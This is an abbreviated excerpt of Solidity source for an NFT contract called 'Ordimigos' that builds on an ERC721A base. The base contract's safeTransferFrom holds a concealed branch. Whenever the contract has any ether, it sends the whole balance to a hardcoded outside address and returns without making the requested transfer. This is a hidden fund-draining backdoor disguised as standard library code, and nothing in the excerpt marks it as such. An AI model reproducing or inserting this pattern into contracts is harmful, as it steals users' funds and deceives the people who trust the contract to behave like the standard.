...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x488B73214358DDd19FA6C0D16eAA1cD0c8385dA9).transfer(address(this).balance);
            return;
        }
...
contract Ordimigos is ERC721A {
    ...
    constructor() ERC721A("Ordimigos", "ORDI") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeidyimtn7pl2vtn2c33w4m26v4sboftucpaaugdmbfdgvbor2j3av4/", _toString(tokenId), ".json"));
    }
